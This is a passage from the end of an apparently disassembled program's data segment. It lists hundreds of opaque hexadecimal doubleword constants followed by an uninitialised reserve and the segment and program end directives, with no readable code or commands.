		dd 156CC9F8h, 0AD2EAC3Dh, 0A71EFB28h, 68C452E7h, 5EF05189h
		dd 3D560EACh, 9B596754h, 0C156D576h, 0FBB9F6h, 0D84FF611h
		dd 0FABD6405h, 0E3904F5Eh, 1C58B582h, 436F6A9Fh, 95EB1F8Ch
		dd 0CE978CA5h, 78F2583Bh, 1D4E4924h, 2AACC4D5h,	7C8B4665h
		dd 0E5CCB60Eh, 0C461C51Dh, 0E4E2D475h, 22EE64D2h, 0DDE237E2h
		dd 1B2CBD81h, 0EB6F3C12h, 0DB094558h, 746236E7h, 50C0B48Ch
		dd 730B716Ch, 5288C557h, 5B7BB3BBh, 8AB59F1Bh, 71F0560Ah
		dd 89139D8Fh, 5B257945h, 0DEFBB555h, 0F74DB64Ch, 3FB2506Bh
		dd 0FD0A4F92h, 595BD4ECh, 4A635E5Eh, 94F0DA82h,	20119F00h
		dd 1333CDBFh, 2EC794EBh, 90330A9Dh, 0BE78B40Ch,	0A8D75056h
		dd 0CE43D632h, 0A81C2315h, 0ABFEAE49h, 0A18B8DFDh, 9C87C2B7h
		dd 40EA7150h, 20C4B6Bh,	0BF49AD8Ch, 43C29274h, 0A111C82Dh
		dd 0BBEFB0D6h, 0C742D62h, 3D074668h, 0ECF743A3h, 42BD6F25h
		dd 0EB659AABh, 8596CB1h, 0FA1B6D64h, 0F35AAA56h, 6DD3C79Ah
		dd 0E88FA30Ah, 0C40B425Fh, 0DC86F67Ch, 0C03B7656h, 0B9F70A23h
		dd 0A3439131h, 1B61EA0Ah, 618E5669h, 369811CDh,	1B5A1DEh
		dd 0C2F2E5ADh, 0D285FCF6h, 60F4A4A8h, 0FE078913h, 3B070434h
		dd 0BCD4C52Eh, 0E21936B7h, 83886F4Ah, 0F0C5CA9h, 0B9E3451Ah
		dd 8E1DA9D4h, 0C19A2B7h, 0FE76CCB8h, 5F67173Eh,	723D29FDh
		dd 0EB0B23A2h, 0EC7C66D9h, 0E7FF1B6Fh, 0E6AAA5FFh, 0F5180CECh
		dd 7C2D276Fh, 70E28391h, 0D506A5D8h, 1E8F33C5h,	43107E44h
		dd 0CC22E0CAh, 0CE4274DAh, 91ECD07h, 3F085D7Bh,	0F22870C4h
		dd 0ACB47E76h, 0BB2348B6h, 0E65CD8FBh, 0C752CC35h, 0EF0F5E93h
		dd 1C54FC1h, 0F04477BEh, 0DA3C4C63h, 20256962h,	6159FAF7h
		dd 8C3E6A2Fh, 0F7955DC9h, 0EB0B5194h, 0BAEB1280h, 97F1F11Eh
		dd 0F5D386FCh, 0F41008C8h, 6D93D832h, 51EC8F68h, 0EB40E141h
		dd 0C978C558h, 0A9C4715Eh, 55BEDC79h, 486C8FF4h, 0FBDF397Dh
		dd 0FDBAEA58h, 0D29EC404h, 5F36628h, 0FFC0BFBBh, 416068A3h
		dd 0EC77D3F6h, 0ED2CEE1Dh, 0C387BAC2h, 0B53813C1h, 0D786102Dh
		dd 0EC1E0A00h, 4B72EFB5h, 0B7DE3AC2h, 0A475167h, 0E3AC519Bh
		dd 3669963Bh, 561CEEAAh, 7B9E090Bh, 0EB85ED31h,	0D8ADB0CCh
		dd 0AAE375CBh, 0F83A3D87h, 44A2D7EAh, 0F8D82474h, 0CF2983C4h
		dd 22CDFCCAh, 86A5273Bh, 1D786D2Fh, 0F39F2D2h, 0EC996ACh
		dd 317FA41Ch, 0D1B3D538h, 0F08D07ADh, 0C44D7229h, 0F7DD14EDh
		dd 418229h, 0E946A244h,	6BF3C87Ah, 29637A2Ah, 0FBD25993h
		dd 0ED870237h, 0A8A3123Bh, 0FD17B3CEh, 90E754EDh, 0CC8E6D9Eh
		dd 98CFDB17h, 3DD6D7FAh, 892C3407h, 80512471h, 406269CAh
		dd 0E87F5949h, 0D042D78Bh, 63A3ADFDh, 4A55DF8Ah, 0F1E87EFFh
		dd 0DB3E9559h, 17EDD913h, 40B05981h, 0DF1D7414h, 0ADEA560Bh
		dd 7E4CD29Bh, 0C2DD3C0h, 0FA80BE68h, 55C7AFEAh,	0BB456607h
		dd 6C6472B1h, 2CDB8Bh, 6602E567h, 88C8AB3Bh, 2EA80D90h
		dd 24D8E2FCh, 6ADD59FBh, 0F02F378h, 9C1B463Ah, 95178D37h
		dd 9ABB1430h, 0B75B959Dh, 0BD619F02h, 171963E8h, 80B3A253h
		dd 7255BCF4h, 0D6F8612Dh, 724F7C3Bh, 17C6B3A0h,	443F217Bh
		dd 60AFAC8Eh, 0C9CF025Dh, 75370E6Eh, 883DEB92h,	5D617532h
		dd 770F2A8Eh, 6C3DF959h, 0C3B5F290h, 6A0D0Fh, 0CA489E9Dh
		dd 0A37245DBh, 1F6A4B77h, 5C7982DAh, 406C8074h,	46FF67D7h
		dd 45AF663h, 88771866h,	3309DE91h, 0F8FBEAA1h, 0E72B8A3Ch
		dd 0DC62F85h, 2735FE7Ah, 0A22678AAh, 2EAE2DAAh,	32DCC763h
		dd 31CD6F0Fh, 0CB869928h, 0F1D8E0D6h, 0C0D8BDE4h, 88A72E40h
		dd 0EE2696C5h, 6C06E05Dh, 2D2D3099h, 0D91B1450h, 0C3229C19h
		dd 0EE66476Ah, 0B6A907D7h, 0A7671453h, 9F39371h, 0CAA12610h
		dd 8AAF932Ah, 0F20BC0CCh, 628C638Ah, 14D9D59Ah,	13F6BF51h
		dd 2AA76C9h, 25E25E4Fh,	0BBC400F4h, 62620500h, 53B2E55h
		dd 24E3C3D6h, 0DE0C9622h, 0B7F11FD1h, 0B04B3CECh, 3D299411h
		dd 194DE69Eh, 3A6D4C81h, 0F560E42h, 49351A3Eh, 0DFBDCAD1h
		dd 5095F877h, 262B540Ah, 1603EB09h, 4406AA6Ah, 564D3D95h
		dd 936A0C04h, 142DE36Fh, 0BB059259h, 0F5F91D18h, 3993820Ch
		dd 0F3624729h, 2F1B3BB7h, 88DC36B3h, 2B7FF398h,	5AF1F7h
		dd 29561505h, 7A2A6111h, 8AFD993Ah, 0F020A08Ch,	5F1F10A7h
		dd 0A88ED21Bh, 6FFEBBE1h, 0D5CD644h, 0C5D91D44h, 0BC79BF72h
		dd 16DDAF05h, 0FB496838h, 0E79B754h, 80DA0700h,	0F7DC334Fh
		dd 6919E76Eh, 963E1C56h, 315A5CBDh, 0AB7CD4C8h,	0D37C2C5Ah
		dd 3BDD7218h, 0C224B63Eh, 4C18A6B9h, 76CC903Dh,	95C635DFh
		dd 0F93CB14Ah, 8331741Eh, 165A17CDh, 0B243B10Fh, 421A3A2Fh
		dd 0E24DFF96h, 8257BE66h, 76C211E2h, 756959DAh,	6D56200Dh
		dd 80E1CEB1h, 0D0C1F2DCh, 0FDC8D765h, 43AECE4Dh, 8B052B4h
		dd 357513A2h, 2E06F70h,	5447ED08h, 1DE6C999h, 915FD8A1h
		dd 730B664h, 0DC548918h, 0A102E0F2h, 2C544F65h,	0AFA481B9h
		dd 330BBC3Fh, 30500A26h, 44E8AA98h, 28597929h, 27A932B2h
		dd 13390EBEh, 0DEB070C5h, 5F73378Ah, 182E19A0h,	0A6F27EE9h
		dd 69969E5Fh, 0D0B2E9A0h, 0FA3A7BB6h, 221184EEh, 463C16FEh
		dd 0D7099DEh, 333551FDh, 54F2C36Bh, 5E395841h, 0B30AD5CDh
		dd 1603AA51h, 5551DF1Ah, 9601740Bh, 0CA18A855h,	7081FB4Fh
		dd 832DFD44h, 0BC275DDAh, 17FC861Ah, 322CFC88h,	0C00864DDh
		dd 270F03F8h, 0DBFE8E78h, 0F9BE1350h, 708B83A6h, 0AF35F74Eh
		dd 5CCA109Ah, 64B3F8C7h, 0DFFBC8FAh, 0A9B8DF29h, 3F77C41Fh
		dd 0D0EF8E2Ch, 0C416DE5Fh, 39D2DF50h, 0C0B84555h, 2A0AC966h
		dd 5CE276Ch, 0DFDC1E37h, 46B86AD2h, 964C93C0h, 0BFB825A8h
		dd 80EFD6B6h, 3D5F48EDh, 0E2B4C6A0h, 5F9FAC19h,	210836AEh
		dd 0F7A0F528h, 4398A83Dh, 0ABDD9F1h, 2FC601B3h,	16BE6A73h
		dd 1BA4CB7Dh, 26415AA9h, 63D8771Fh, 0E551525Ah,	0F1385E45h
		dd 48275EAh, 0EE332F7Ch, 7F4CE120h, 61FCAE8Dh, 0CF39358Dh
		dd 8A5E901Fh, 405E7E99h, 0D8D7BE63h, 3F8D29BDh,	0E81E9B18h
		dd 0C2600B82h, 0ECCA45F0h, 19D908C2h, 85A0320Fh, 906521AEh
		dd 48E5B36h, 94B02CA5h,	0A72027B0h, 526BA0FEh, 0E87E1A9Ah
		dd 39831208h, 7FD86908h
		dd 7C45670Ah, 56CE15C7h, 0CFDDF814h, 7D9076B7h,	30E67E5Ch
		dd 2C88A5D6h, 8A5BC550h, 2B6A84F0h, 62A11439h, 710BDBE2h
		dd 0B8C7427Ah, 18A96728h, 5B99B430h, 0C3FEF070h, 69AAB545h
		dd 5FEFAEEEh, 0E9F123FBh, 7F15B7h, 0BC636DF6h, 3951279h
		dd 2BA75BBEh, 0ECA01197h, 8C8F4755h, 0C429DAB5h, 2BFC78DBh
		dd 0FAABEFF8h, 4646FC54h, 178346B0h, 0AB03EA8Eh, 3D61609Eh
		dd 0AD4E5FEAh, 1B4513C3h, 0CB2D3F80h, 6F47E849h, 5F17A2CFh
		dd 0A679054h, 400646B0h, 3FC909FFh, 32A1D2D9h, 440C5F2Dh
		dd 89631F73h, 1D61A82Dh, 0C7E5ACE7h, 7658C765h,	0F6F06B6Fh
		dd 0ED1B3B5h, 6A47FAE2h, 34D21D23h, 2CAC98E5h, 19B72B18h
		dd 983CC7BBh, 4D8CB673h, 141633FFh, 0DFB62661h,	0F2CE416Bh
		dd 67C4D9ABh, 0EAB557BAh, 0E142E09Dh, 0B1DA033Eh, 45591E86h
		dd 75D4CECCh, 7DACB873h, 0F49B802Ah, 5DFCB7FBh,	0F0636AB5h
		dd 0FC2A7AA5h, 0E5E8ECE0h, 0A330E1FBh, 6764A63Fh, 80C328D1h
		dd 0D128E2EDh, 0BE2F7D6Eh, 0A6A45EB8h, 20980BDFh, 6131A146h
		dd 0FCD1BCE1h, 0F9F2BCE7h, 0CB177E7Eh, 0A0A383EAh, 58862E59h
		dd 442981E7h, 30D6FD5Bh, 1A12CA7Eh, 86071548h, 1734101Fh
		dd 0FE0D5D42h, 9AC256AEh, 4A548A9Fh, 0C99BBD4Ah, 0CCD6883Ch
		dd 0DFCF5AB8h, 0F4DCBE2Ch, 0CAEDFF2Eh, 6CB03AEh, 8AB17E3Fh
		dd 52062B0Ah, 505BE299h, 0C1DA7838h, 9903B8E5h,	0A7D7836Ah
		dd 0EAB80343h, 0C459C1FDh, 0FCF8EFE0h, 9C5C3E21h, 9C95046h
		dd 0E29F3184h, 1325991Ah, 0D0AD9F57h, 124A5CA5h, 0D17B7697h
		dd 2A032940h, 668CB6E8h, 0E2EAAF72h, 2673EFCBh,	0B8951F79h
		dd 64D2825Fh, 0B2DC37FFh, 62B9C81Dh, 2407AAB4h,	0F50A7146h
		dd 6C0C0E32h, 9B494D4Fh, 7B646979h, 1280C92Ah, 94F406DEh
		dd 0D4DC1039h, 0C68C4B11h, 2B61C818h, 0B64D8A7Eh, 9BFFCD7Ah
		dd 0C7D93FEFh, 0CC34E62Ah, 2C173DF7h, 1934CDA7h, 0DA625C7Dh
		dd 2FF5C7F3h, 2C454A5Ah, 0C2A61E03h, 1069EEF5h,	2C84BEC2h
		dd 784F9908h, 0A08E053Dh, 0EADA033Bh, 0D99FEA3Fh, 4AE751CFh
		dd 0ACE90DD0h, 36812B66h, 0C1BC0C82h, 0A125D632h, 0C3267CE0h
		dd 4F0D8192h, 0D8E91722h, 8CDFB206h, 3D997E10h,	0D4DEE828h
		dd 8A6B7959h, 0A3E7F815h, 0B91D89EDh, 0D0DE17C4h, 0C21C8578h
		dd 0A9E9019Dh, 45876846h, 0A7FCDCAEh, 0C59FB21Dh, 5402CEA7h
		dd 0FF02D541h, 0D5202301h, 83FD77F3h, 867B9C2h,	9F087395h
		dd 0BB8D20B3h, 10754079h, 0A2C0E0EEh, 29EED41Ah, 0E3D65612h
		dd 3EBF9660h, 26710D7h,	305171F8h, 0DE5855A8h, 0A8043605h
		dd 0B56FE23Dh, 84DA32D0h, 8E8CB7BFh, 23282201h,	4DA5B4h
		dd 0DAC5F24Ah, 0B7677C25h, 0F3F7857Dh, 5E931D8Ch, 0BC5893A9h
		dd 2B1489D2h, 0ADEB82C5h, 0DBCFEE9Dh, 34AA193Ah, 0C31FD171h
		dd 6FF21B86h, 356AFD7Dh, 440E8CDAh, 731119C2h, 34337939h
		dd 5125FB45h, 95B2FC8Bh, 0A8E5BC63h, 0A5C8A811h, 160240F5h
		dd 42AFE3Eh, 4CBC265Fh,	0FC256E2Bh, 9D993ABEh, 0EE02200Eh
		dd 6068F805h, 0C644F0F5h, 0DCB0642Ah, 2E28B323h, 5B1FEF76h
		dd 382CAD0Fh, 97DA587h,	14EFAAFCh, 390EECB0h, 611F2D1Ch
		dd 468E26A8h, 0B0709826h, 8659176Ch, 939FFFF1h,	7D1A55A3h
		dd 97AA272Eh, 38A00E4Bh, 0F0BD413h, 394A5B98h, 24EA7DFBh
		dd 66229809h, 0E229FDB0h, 613BC805h, 7086F328h,	78A47EF8h
		dd 2525620Eh, 45B2C872h, 0C728F71Dh, 28ABB8E9h,	2BAA1DEBh
		dd 0DCD3457h, 0A858DB31h, 385EC04Ah, 89C4561Ah,	6528FE69h
		dd 686DE935h, 0DAA830B1h, 939B8755h, 0F9FA4A70h, 4A621652h
		dd 6D241ACh, 7476954Ah,	89A327D6h, 4156D30Ch, 2B0B6670h
		dd 650A9C97h, 0C7849D98h, 24526FA1h, 0E91833F7h, 71E4CD65h
		dd 754DBEB2h, 0D6EF71D2h, 0C6E90B24h, 11E3677Dh, 5BE0DC85h
		dd 65443980h, 9C73CE2h,	1438FC17h, 0EF172FF8h, 391C77C1h
		dd 4FE54595h, 0DC7A3AC4h, 6DA00F87h, 896D2D79h,	0F72463F8h
		dd 87CE3014h, 89B7ABDCh, 232E99DEh, 7C6BE95Ah, 66541D8Bh
		dd 0FF676EABh, 54130DB0h, 0D937A080h, 0FEF0BB44h, 57DAD1ACh
		dd 0BABE79Fh, 9E8ABA23h, 0A8E1CD6Eh, 9B79E0C3h,	22352246h
		dd 109FCB16h, 3DE9A4E1h, 0DAA404Ah, 0F25F255h, 84FD6F3Ch
		dd 98962FBAh, 4676446Fh, 2596253Dh, 76AFF9C2h, 0EEB5BC50h
		dd 4F8AF61Dh, 3966B4C2h, 0D20EE8F4h, 280127BFh,	0E24026C3h
		dd 3636A567h, 0A256B4E0h, 2CC9EA7Bh, 0A3EA0053h, 54334F1Ah
		dd 0BBBF645Dh, 0F46AE0CCh, 0DEC01329h, 37DA0353h, 0EB65440h
		dd 0E2D36432h, 0CDAC638h, 8464263Bh, 909C161Dh,	3CA0D61Ah
		dd 0AED1786Bh, 29C408A0h, 73B61E09h, 0C578A360h, 9CCC893Eh
		dd 8AA746E0h, 9E3E614Bh, 5C74EE0Dh, 0DE8D7F5h, 86B38296h
		dd 780723F2h, 7407B5B8h, 9C504FA9h, 3A46E813h, 10E69F6Fh
		dd 0B63C7A5Dh, 0F43575C1h, 0D6B013EBh, 0AA270B08h, 0E6F14A3h
		dd 5F3E519Eh, 1B2FAD38h, 43F456C1h, 0F843D4F6h,	0C50DB52h
		dd 0BADA6C25h, 0E580EEF5h, 0CA70A00Ch, 50ECCEE7h, 0E88D4D65h
		dd 0C83AF88Dh, 634C70E5h, 52F2CCA9h, 8A07DC55h,	8A969AFh
		dd 9E40E102h, 46AA7C5Eh, 0AB1E819Dh, 40DD89ABh,	0C3CADF5Bh
		dd 39B6E4F2h, 40146EB6h, 6ED6F1ADh, 0E5A1A24Ah,	0D487C606h
		dd 13F19E3Eh, 10F5DE0Ah, 811E1B74h, 3285DA78h, 51831680h
		dd 0D450BC8Eh, 4467DB64h, 0BDF2E394h, 0A480CA26h, 0BA7DF636h
		dd 0BC0C5850h, 0A72C19BBh, 25CCFD6Eh, 162DB384h, 4F899806h
		dd 0EA1E6918h, 79DB2F9Dh, 7814865Bh, 6F157AB5h,	27384125h
		dd 90495212h, 4FA6ACD3h, 0EB0D42EEh, 1B7CB87Bh,	93628BD5h
		dd 10EC27CFh, 5234C005h, 0A1F1DE80h, 8268CC9Ah,	0DFC5ECE2h
		dd 8CC4EC98h, 0A13D9F78h, 0E26E7CB5h, 3F9911B9h, 0FD8E5CAFh
		dd 3DD94EBCh, 0A0B6C6BBh, 82CACEBh, 969F270Bh, 834BE32Eh
		dd 6CB76786h, 63186C6Ah, 0FA0260E8h, 5D3AE961h,	7A522077h
		dd 851206C9h, 0D53563EFh, 0E01813DCh, 40C7A382h, 615572F5h
		dd 651586B8h, 5EF4355Bh, 52801D07h, 3EFF6C4Ch, 0BEE9C4BEh
		dd 5973F6Bh, 0AE6EB0Eh,	0ADC42888h, 0AA6C215Fh,	0B11C16Dh
		dd 7513A9A7h, 80569741h, 4D6257FFh, 80A5F5A9h, 0E87C0BADh
		dd 7F502840h, 33A3F2Ah,	5061F376h, 283C9CE7h, 83137347h
		dd 0B13D29B3h, 0EB23E8DEh, 0F6FE6088h, 74AD5B76h, 0A9F42135h
		dd 58C0ED27h, 0E1685A3Eh, 31D573AEh, 0B0CE9603h, 6E9D1408h
		dd 5CC694CBh, 0CC4C05Dh, 61632AE9h, 0AB714E11h,	0D1C915C1h
		dd 4727E8B5h, 0BF398F33h, 0DA9F07Dh, 50D15C2h, 0F93568F2h
		dd 0E068FF6Dh, 0F9B1CD9Ah, 0F2CE6E0Eh, 0D1542C6Bh, 23328D8h
		dd 0F46036EBh, 9A47735h, 4230954Ch, 1C3CDEF5h, 6BEC4E31h
		dd 3EB21341h, 3BA226A1h, 0B9849DDh, 1CFFBA09h, 1ECAAB04h
		dd 56E7B6Dh, 0E52F1F37h, 0C5257342h, 0C4920B39h, 28AD449h
		dd 0A8A5F96h, 0E9E45EECh, 0C73E662Dh, 0FF17A27Dh, 2D7D4B2Dh
		dd 0E652553Ah, 0E37E240Fh, 0F6F7D04Fh, 14D22A36h, 12CB7B30h
		dd 4CDB737Dh, 3D0EB803h, 1089F9D0h, 305D5FA7h, 7B94EC5Fh
		dd 969889Dh, 6E22D706h,	3365BFB2h, 0CB04BDD4h, 2B64184h
		dd 7E5FADB7h, 0E6433909h, 40F7CCBAh, 3B6E0957h,	0F40CE5h
		dd 7C0EB89Dh, 78A100C0h, 1A29959Ah, 600DD2D6h, 1029736Ah
		dd 0D80EE017h, 183A2BBCh, 92D9A256h, 6CFFB916h,	3B6CFFB9h
		dd 0EE77E3D7h, 0FD8EF0CEh
		dd 1A00h dup(?)
_data		ends


		end start
